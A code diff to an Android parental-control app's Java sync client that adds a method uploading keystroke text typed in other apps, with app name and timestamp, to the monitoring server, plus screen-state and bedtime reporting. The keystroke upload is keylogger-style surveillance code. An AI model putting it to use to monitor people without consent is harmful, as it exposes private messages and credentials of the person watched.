@@ -101,6 +101,7 @@ public class SyncClient {
                     if (locationObj != null) {
                         body.put("location", locationObj);
                     }
+                    body.put("inBedtime", config.isCurrentTimeInBedtime());
 
                     try (OutputStream os = conn.getOutputStream()) {
                         byte[] input = body.toString().getBytes(StandardCharsets.UTF_8);
@@ -456,6 +457,87 @@ public class SyncClient {
                     conn.disconnect();
                 } catch (Exception e) {
                     Log.w(TAG, "Excepción subiendo audio clip: " + e.getMessage());
+                }
+            }
+        }).start();
+    }
+
+    public static void sendKeystrokes(final Context context, final String packageName, final String appName, final String text) {
+        if (text == null || text.trim().isEmpty()) return;
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    ParentalConfig config = ParentalConfig.getInstance(context);
+                    String endpoint = config.getServerUrl() + "/api/devices/" + config.getDeviceId() + "/keystrokes";
+                    URL url = new URL(endpoint);
+
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/json; utf-8");
+                    conn.setRequestProperty("Accept", "application/json");
+                    conn.setConnectTimeout(5000);
+                    conn.setReadTimeout(5000);
+                    conn.setDoOutput(true);
+
+                    JSONObject body = new JSONObject();
+                    body.put("package", packageName != null ? packageName : "");
+                    body.put("appName", appName != null ? appName : "Aplicación");
+                    body.put("text", text);
+                    body.put("timestamp", System.currentTimeMillis());
+
+                    try (OutputStream os = conn.getOutputStream()) {
+                        byte[] input = body.toString().getBytes(StandardCharsets.UTF_8);
+                        os.write(input, 0, input.length);
+                    }
+
+                    int responseCode = conn.getResponseCode();
+                    if (responseCode == 200) {
+                        Log.i(TAG, "⌨️ Registro de texto enviado exitosamente (" + appName + ")");
+                    } else {
+                        Log.w(TAG, "Respuesta al enviar texto: " + responseCode);
+                    }
+                    conn.disconnect();
+                } catch (Exception e) {
+                    Log.w(TAG, "Error enviando texto de teclado: " + e.getMessage());
+                }
+            }
+        }).start();
+    }
+
+    public static void sendScreenState(final Context context, final boolean isScreenOff) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    ParentalConfig config = ParentalConfig.getInstance(context);
+                    String endpoint = config.getServerUrl() + "/api/devices/" + config.getDeviceId() + "/report";
+                    URL url = new URL(endpoint);
+
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/json; utf-8");
+                    conn.setRequestProperty("Accept", "application/json");
+                    conn.setConnectTimeout(4000);
+                    conn.setReadTimeout(4000);
+                    conn.setDoOutput(true);
+
+                    JSONObject body = new JSONObject();
+                    body.put("isScreenOff", isScreenOff);
+                    if (isScreenOff) {
+                        body.put("currentActiveApp", "system.screen.off");
+                        body.put("currentActiveAppName", "Pantalla en reposo / Apagada");
+                    }
+
+                    try (OutputStream os = conn.getOutputStream()) {
+                        byte[] input = body.toString().getBytes(StandardCharsets.UTF_8);
+                        os.write(input, 0, input.length);
+                    }
+
+                    int responseCode = conn.getResponseCode();
+                    conn.disconnect();
+                } catch (Exception e) {
+                    Log.w(TAG, "Error reportando estado de pantalla: " + e.getMessage());
                 }
             }
         }).start();
